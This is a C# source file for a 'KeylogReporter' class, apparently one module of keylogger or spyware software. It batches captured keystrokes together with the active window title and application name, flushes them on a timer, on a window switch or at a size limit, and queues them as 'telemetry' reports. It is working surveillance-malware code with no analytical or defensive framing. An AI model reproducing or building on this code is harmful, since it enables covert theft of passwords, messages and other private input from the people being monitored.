using System;
using System.Collections.Generic;
using System.Text;

namespace XYZ.modules.reporters
{
    /// <summary>
    /// Reports keylog data with context (window, application)
    /// </summary>
    public class KeylogReporter
    {
        public const string REPORT_TYPE = "keylog";
        
        private static StringBuilder currentBuffer = new StringBuilder();
        private static string currentWindowTitle = "";
        private static string currentApplication = "";
        private static DateTime bufferStartTime = DateTime.UtcNow;
        private static readonly object lockObj = new object();
        private static System.Threading.Timer flushTimer;

        public static void Initialize()
        {
            // Flush keylogs every 60 seconds
            flushTimer = new System.Threading.Timer(FlushCallback, null,
                TimeSpan.FromSeconds(60), TimeSpan.FromSeconds(60));
        }

        /// <summary>
        /// Add keystrokes to the buffer
        /// </summary>
        public static void AddKeystroke(string key, string windowTitle, string application)
        {
            lock (lockObj)
            {
                // If window changed, flush current buffer first
                if (!string.IsNullOrEmpty(currentWindowTitle) && 
                    currentWindowTitle != windowTitle && 
                    currentBuffer.Length > 0)
                {
                    FlushBuffer();
                }

                currentWindowTitle = windowTitle;
                currentApplication = application;
                currentBuffer.Append(key);

                // Flush if buffer gets too large
                if (currentBuffer.Length > 1000)
                {
                    FlushBuffer();
                }
            }
        }

        /// <summary>
        /// Force flush the current buffer
        /// </summary>
        public static void Flush()
        {
            lock (lockObj)
            {
                FlushBuffer();
            }
        }

        private static void FlushCallback(object state)
        {
            Flush();
        }

        private static void FlushBuffer()
        {
            if (currentBuffer.Length == 0) return;

            var data = new Dictionary<string, object>
            {
                { "content", currentBuffer.ToString() },
                { "window_title", currentWindowTitle },
                { "application", currentApplication },
                { "captured_at", bufferStartTime.ToString("o") },
                { "duration_seconds", (DateTime.UtcNow - bufferStartTime).TotalSeconds }
            };

            TelemetryAggregator.QueueReport(REPORT_TYPE, data);

            // Reset buffer
            currentBuffer.Clear();
            bufferStartTime = DateTime.UtcNow;
        }

        /// <summary>
        /// Get current buffer length (for debugging)
        /// </summary>
        public static int GetBufferLength()
        {
            lock (lockObj)
            {
                return currentBuffer.Length;
            }
        }
    }
}
